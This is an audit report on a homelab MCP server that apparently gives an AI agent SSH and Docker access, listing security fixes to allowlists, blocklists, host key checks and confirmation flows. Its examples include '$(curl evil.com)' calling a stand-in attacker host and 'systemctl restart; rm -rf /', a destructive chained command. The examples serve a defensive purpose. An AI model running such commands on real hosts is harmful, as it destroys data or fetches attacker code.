# Spacebot Homelab MCP — Security & Design Audit Findings

Comprehensive audit of the `spacebot-homelab-mcp` implementation against four design documents:

1. `spacebot-homelab-mcp/IMPLEMENTATION-GUIDE.md`
2. `spacebot/homelab-integration/architecture-decision.md`
3. `spacebot/homelab-integration/security-approach.md`
4. `spacebot/homelab-integration/connection-manager.md`

## Summary

| Priority | Found | Fixed | Remaining |
|----------|-------|-------|-----------|
| P1 (Security) | 10 | 10 | 0 |
| P2 (Design deviation) | 14 | 14 | 0 |
| P3 (Minor) | 9 | 7 | 2 (accepted) |

All P1 and P2 issues have been resolved across three audit rounds. Two P3 items are accepted limitations (rmcp macro constraint for tool registration, SSH `validate_session()` uses timestamp-only check).

---

## Round 1 Findings (11 fixes)

### P1-1: Config file permission validation missing
**Design ref:** security-approach.md Layer 1 — "config file must not be world-readable"
**Finding:** `Config::load()` did not check file permissions.
**Fix:** Added `check_config_permissions()` in `config.rs` using `std::os::unix::fs::PermissionsExt`. Rejects files with any "other" bits or group write/execute. Acceptable modes: `0600`, `0640`.

### P1-2: Blocked pattern `"$(("` was wrong
**Design ref:** security-approach.md Layer 4 — blocked patterns must catch command substitution
**Finding:** Blocked pattern list included `"$(("` (arithmetic expansion) instead of `"$("` (command substitution). Commands like `$(curl evil.com)` would pass.
**Fix:** Changed to `"$("` in both `config.rs` default and `example.config.toml`.

### P1-3: `exec_confirmed()` missing blocked pattern check
**Design ref:** security-approach.md Layer 4 — blocked patterns enforced unconditionally
**Finding:** After confirmation, `exec_confirmed()` ran the command without re-checking blocked patterns. A confirmed command could bypass the blocklist.
**Fix:** Added `match_blocked_pattern` check at the top of `exec_confirmed()`.

### P2-4: `cleanup_stale_sessions()` held lock during I/O probes
**Design ref:** connection-manager.md — "cleanup must not block checkout/return"
**Finding:** Original cleanup locked the session queue for the entire duration of keepalive probes, blocking all concurrent checkouts.
**Fix:** Rewrote with 3-phase async probing: (1) drain expired and idle sessions under lock, (2) probe idle sessions with `channel_open_session()` with lock released, (3) return alive sessions under lock.

### P2-5: `check_connectivity()` always created disposable connections
**Design ref:** connection-manager.md — "avoid unnecessary connection churn"
**Finding:** Health monitor created a throwaway SSH connection every 30 seconds per host, even when pooled sessions existed.
**Fix:** Now checks for valid pooled sessions first. Only creates a disposable connection if no valid sessions exist.

### P2-6: No `Degraded` connection status
**Design ref:** connection-manager.md — "three health states: Connected, Degraded, Disconnected"
**Finding:** Only `Connected` and `Disconnected` existed. First failure immediately blocked requests.
**Fix:** Added `Degraded` variant. 1-2 consecutive failures = Degraded (requests still allowed), 3+ = Disconnected (requests blocked).

### P2-7: Audit timestamps used Unix epoch
**Design ref:** security-approach.md Layer 7 — "ISO 8601 timestamps"
**Finding:** Audit log entries used `SystemTime::now().duration_since(UNIX_EPOCH)` producing raw seconds.
**Fix:** Added `chrono` crate. Timestamps now use `Utc::now().format("%Y-%m-%dT%H:%M:%SZ")`.

### P2-8: `ToolsConfig.enabled` was `Vec<String>` (no "all enabled" default)
**Design ref:** security-approach.md Layer 2 — "omitting [tools] section enables all tools"
**Finding:** `enabled: Vec<String>` meant an omitted config always resulted in empty vec = no tools enabled.
**Fix:** Changed to `Option<Vec<String>>`. `None` = all tools enabled, `Some([])` = no tools, `Some(["a","b"])` = only listed.

### P3-10: Syslog support missing
**Design ref:** security-approach.md Layer 7 — "optional syslog output"
**Finding:** `AuditConfig` had no syslog option.
**Fix:** Added `SyslogConfig` struct and syslog emission via system `logger` command in `audit.rs`.

### P3-12: IMPLEMENTATION-GUIDE.md checkboxes not updated
**Finding:** Milestone checkboxes were all unchecked despite M1-M4 being implemented.
**Fix:** Checked M1-M4 boxes in IMPLEMENTATION-GUIDE.md.

### P3-13: Docker container list used client-side filtering
**Design ref:** architecture-decision.md — "leverage Docker API filtering"
**Finding:** `name_filter` was applied after fetching all containers.
**Fix:** Passed name filter via bollard's `filters` HashMap for server-side filtering.

---

## Round 2 Findings (13 fixes)

### P1-1 NEW (CRITICAL): SSH host key verification always accepted
**Design ref:** security-approach.md Layer 3 — "SSH host key verification"
**Finding:** `SshClientHandler::check_server_key()` at `connection.rs:133-138` always returned `Ok(true)`, accepting any server key without verification. This made all SSH connections vulnerable to MITM attacks.
**Fix:** Replaced `SshClientHandler` with a struct carrying `host` and `port` fields. `check_server_key()` now calls `russh::keys::check_known_hosts()` which verifies against `~/.ssh/known_hosts`. Behavior:
- Key matches known_hosts: accepted
- Key not found: rejected with instructions to run `ssh-keyscan`
- Key changed: rejected with MITM warning
- Other errors (missing file, parse errors): rejected with error details

### P1-4 NEW: Bare `sudo` in default command allowlist
**Design ref:** security-approach.md Layer 4 — "allowlist should be narrowly scoped"
**Finding:** Default `allowed_prefixes` included bare `"sudo"`, allowing `sudo <anything>` — completely undermining the allowlist.
**Fix:** Removed bare `"sudo"`. Replaced with specific safe prefixes: `"sudo systemctl status"`, `"sudo systemctl restart"`, `"sudo zpool"`, `"sudo zfs"`. Also tightened `"systemctl"` to `"systemctl status"`, `"systemctl is-active"`, `"systemctl list-units"`.

### P1-3 NUANCE: Blocked patterns checked after confirmation token issued
**Design ref:** security-approach.md Layer 4 + Layer 8 interaction
**Finding:** In `exec()`, the confirmation check ran BEFORE the blocked pattern check. This meant a command like `systemctl restart; rm -rf /` matching a confirmation `when_pattern` would get a token issued, even though `; ` is in the blocked patterns. The token would be wasted.
**Fix:** Moved blocked pattern check to run immediately after prefix validation, before any confirmation logic. Commands hitting blocked patterns are rejected instantly without wasting tokens.

### P2-1 NEW: Output envelope used text tags instead of JSON
**Design ref:** security-approach.md Layer 6 — structured JSON envelope
**Finding:** `wrap_output_envelope()` produced `[tool_result source="..." data_classification="untrusted_external"]...[/tool_result]` text tags. The design spec requires a JSON envelope: `{"type":"tool_result","source":"...","data_classification":"untrusted_external","content":"..."}`.
**Fix:** Changed `wrap_output_envelope()` to produce JSON via `serde_json::json!()`.

### P2-4 NEW: SSH hosts marked Connected at startup without testing
**Design ref:** connection-manager.md — "health status reflects actual connectivity"
**Finding:** In `ConnectionManager::new()`, SSH hosts were marked `Connected` via `mark_healthy()` immediately after pool creation, without any actual connectivity test. Docker hosts correctly tested via `ping()`.
**Fix:** Removed `mark_healthy()` call for SSH pools at startup. SSH pools now start in `Connecting` state and get their first real health check from the health monitor's first cycle (within 30 seconds).

### P2-5 NEW: Docker TLS certs detected but not used
**Design ref:** architecture-decision.md — "TLS for remote Docker daemons"
**Finding:** `DockerClient::new()` detected `cert_path` and `key_path` but always called `connect_with_http()`, ignoring TLS certificates entirely.
**Fix:** Added `ca_path` field to `DockerHost` config. When all three TLS fields (`cert_path`, `key_path`, `ca_path`) are present, uses `bollard::Docker::connect_with_ssl()`. Added `ssl` feature to bollard dependency. Warns if partial TLS config is provided (cert/key without CA).

### P2-6 NEW: `confirm_operation` subject to `tools.enabled` check
**Design ref:** security-approach.md Layer 8 — confirmation flow must always be available
**Finding:** `confirm_operation` tool handler called `ensure_tool_available()` which checks `tools.is_enabled("confirm_operation")`. If an operator set `tools.enabled = ["ssh.exec", ...]` without including `confirm_operation`, the entire confirmation flow would break silently.
**Fix:** Exempt `confirm_operation` from the `tools.enabled` check. Rate limiting still applies.

### P2-9 NEW: `example.config.toml` missing `[confirm]` section
**Design ref:** IMPLEMENTATION-GUIDE.md — "example config should document all features"
**Finding:** No commented-out example of confirmation rules in the example config.
**Fix:** Added comprehensive `[confirm]` section examples showing both `when_pattern` and `"always"` rule styles.

### P3-6: Docker `container.start` / `container.stop` lack `dry_run`
**Design ref:** architecture-decision.md — "all mutating operations should support dry_run"
**Finding:** `ssh.exec` had `dry_run` parameter but `container.start` and `container.stop` did not.
**Fix:** Added `dry_run: Option<bool>` parameter to both `container_start()` and `container_stop()`. When `true`, returns a DRY RUN message without executing.

### P3-7: `private_key_passphrase` stored as plaintext, no env var resolution
**Design ref:** security-approach.md Layer 1 — "minimize secrets in config files"
**Finding:** SSH key passphrases could only be specified as literal strings in the config file.
**Fix:** Added `resolve_env_var()` helper that resolves `$VAR_NAME` and `${VAR_NAME}` syntax. Applied during config validation to `private_key_passphrase`. Operators can now use `private_key_passphrase = "${SSH_KEY_PASSPHRASE}"`.

### P3-8: `example.config.toml` missing `keepalive_interval_secs`
**Finding:** The SSH pool config example listed all pool settings except `keepalive_interval_secs`.
**Fix:** Added `keepalive_interval_secs = 60` to the `[ssh.pool]` section.

### P3-4 (Accepted): Disabled tools still registered at MCP level
**Finding:** The `#[tool_router]` macro registers all 9 tools at the MCP schema level regardless of `tools.enabled`. Disabled tools return an error when called, but they appear in `tools/list`.
**Status:** Accepted limitation — rmcp's macro-based registration doesn't support conditional registration. The runtime check in `ensure_tool_available()` correctly blocks execution of disabled tools.

### P3-X: Updated integration test for new security behavior
**Finding:** The `test_ssh_exec_confirmation_flow` test used `"sudo rm -rf /tmp/old"` which now fails at both prefix validation (bare `sudo` removed) and blocked pattern check (`rm -rf`).
**Fix:** Changed test command to `"sudo systemctl restart nginx"` which passes prefix validation and triggers the `when_pattern = ["systemctl restart"]` confirmation rule.

---

## Round 3 Findings (5 fixes + 13 new tests)

### P1-NEW-2: ConfirmRule `#[serde(untagged)]` accepted typos silently
**Design ref:** security-approach.md Layer 8 — confirmation rules must be unambiguous
**Finding:** `ConfirmRule` used `#[serde(untagged)]` with `Always(String)` and `WhenPattern { when_pattern }` variants. A typo like `rule = "aways"` silently parsed as `Always("aways")` but never matched the expected `"always"` string — effectively disabling the confirmation requirement with no warning.
**Fix:** Added `validate_confirm_rules()` in `config.rs` called during `Config::validate()`. Rejects any `Always` value that isn't exactly `"always"`. Returns a clear error message identifying the problematic rule. Added unit test covering accept/reject cases.

### P1-NEW-3: Unencrypted TCP Docker example lacked security warning
**Design ref:** security-approach.md — "warn operators about insecure configurations"
**Finding:** `example.config.toml` showed `url = "tcp://nas:2376"` without any warning that unencrypted TCP exposes the Docker daemon to network-level attackers.
**Fix:** Added a prominent security comment in the example config warning against using plain TCP in production and recommending TLS or Unix socket alternatives.

### P2-NEW-8: `confirm_operation` only dispatched to `ssh.exec`
**Design ref:** security-approach.md Layer 8 — "confirmation flow for all mutating operations"
**Finding:** The `confirm_operation` handler in `mcp.rs` only matched `"ssh.exec"` as the original tool. `docker.container.start` and `docker.container.stop` (both mutating and both supporting `dry_run`) had no confirmation dispatch path, so confirming them would return an "unknown tool" error.
**Fix:** Extended the `confirm_operation` match block to handle `"docker.container.start"` and `"docker.container.stop"`, calling the respective functions after token validation.

### P3-NEW-4: `SshHost` Debug impl exposed passphrase
**Design ref:** security-approach.md Layer 1 — "minimize secret exposure"
**Finding:** `SshHost` derived `Debug` which would print `private_key_passphrase` in plaintext in any debug log or error message.
**Fix:** Replaced `#[derive(Debug)]` with a custom `impl Debug for SshHost` that redacts the passphrase field as `"[REDACTED]"` when present, `"None"` when absent. All other fields are printed normally.

### P3-NEW-5: Config structs derived `Serialize` unnecessarily
**Design ref:** security-approach.md Layer 1 — "minimize paths that could leak secrets"
**Finding:** All config structs derived `Serialize`, meaning any code path that serialized config (logging, error messages, debug output) could inadvertently emit secrets like `private_key_passphrase` or TLS key paths.
**Fix:** Removed `Serialize` from all config structs and `ConfirmRule`. Config is only ever deserialized from TOML; it never needs to be serialized back. This eliminates an entire class of accidental secret exposure.

### P3-4 (Accepted): Disabled tools still registered at MCP level
**Status:** Carried forward from Round 2 — rmcp `#[tool_router]` macro limitation. Runtime check blocks execution.

### P3-X (Accepted): SSH `validate_session()` uses timestamp-only check
**Finding:** `validate_session()` checks `last_used` timestamp against `idle_timeout` but does not perform an I/O probe. A session could be stale from a network perspective but still pass validation.
**Status:** Accepted — the cleanup task performs real I/O probes periodically. Checkout-time validation is intentionally lightweight to avoid latency on every operation.

### 13 New Unit Tests Added
| Test | File | Covers |
|------|------|--------|
| `test_tools_config_none_enables_all` | `src/config.rs` | `is_enabled()` returns true when `enabled = None` |
| `test_tools_config_some_filters` | `src/config.rs` | `is_enabled()` returns true only for listed tools |
| `test_tools_config_empty_disables_all` | `src/config.rs` | `is_enabled()` returns false when `enabled = Some([])` |
| `test_resolve_env_var_dollar` | `src/config.rs` | `resolve_env_var("$FOO")` resolution |
| `test_resolve_env_var_braced` | `src/config.rs` | `resolve_env_var("${FOO}")` resolution |
| `test_resolve_env_var_literal` | `src/config.rs` | `resolve_env_var("literal")` passthrough |
| `test_check_config_permissions_ok` | `src/config.rs` | `check_config_permissions()` accepts `0600` |
| `test_check_config_permissions_reject` | `src/config.rs` | `check_config_permissions()` rejects `0644` |
| `test_wrap_output_envelope_json` | `src/tools/mod.rs` | JSON envelope structure validation |
| `test_truncate_output` | `src/tools/mod.rs` | Output truncation at byte limit |
| `test_redact_env_values` | `src/tools/docker.rs` | Environment variable redaction in container inspect |
| `test_confirm_rule_validation` | `src/config.rs` | `validate_confirm_rules()` accepts `"always"`, rejects typos |
| `test_token_ttl_expiry` | `src/confirmation.rs` | Token expires after TTL via `with_custom_ttl()` |

---

## Files Modified

| File | Changes |
|------|---------|
| `src/connection.rs` | SSH host key verification, SSH startup health, Docker TLS |
| `src/config.rs` | Permissions check, blocked pattern fix, sudo removal, env var resolution, `DockerHost.ca_path`, `Serialize` removed, ConfirmRule validation, custom `SshHost` Debug (redacts passphrase), 8 unit tests |
| `src/tools/ssh.rs` | Blocked pattern ordering, `exec_confirmed` blocklist check |
| `src/tools/mod.rs` | JSON output envelope, truncation, 2 unit tests |
| `src/tools/docker.rs` | API-level filtering, dry_run for start/stop, env redaction, 1 unit test |
| `src/mcp.rs` | confirm_operation exemption, dry_run args, docker start/stop confirmation dispatch |
| `src/audit.rs` | ISO 8601 timestamps, syslog support |
| `src/confirmation.rs` | `with_custom_ttl()` test helper, 1 unit test |
| `example.config.toml` | Allowlist update, keepalive, [confirm] section, TLS example with security warning, env var example |
| `Cargo.toml` | `chrono` crate, bollard `ssl` feature |
| `tests/mcp_server.rs` | Updated confirmation flow test |
| `IMPLEMENTATION-GUIDE.md` | Milestone checkboxes |

## Verification

```
cargo build    # Clean, no warnings
cargo test     # 33/33 tests pass (30 unit + 3 integration)
```
